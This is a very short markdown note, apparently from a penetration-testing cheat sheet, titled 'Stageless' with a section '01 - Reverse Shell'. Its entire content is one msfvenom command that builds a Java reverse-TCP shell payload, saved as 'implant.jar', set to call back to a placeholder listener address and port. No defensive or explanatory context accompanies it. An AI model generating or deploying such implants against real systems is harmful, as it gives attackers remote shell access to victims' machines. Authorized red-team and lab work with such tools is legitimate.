# Stageless

## 01 - Reverse Shell

```
$ msfvenom -p java/shell_reverse_tcp lhost=<IP> lport=<PORT> -f raw -o implant.jar
```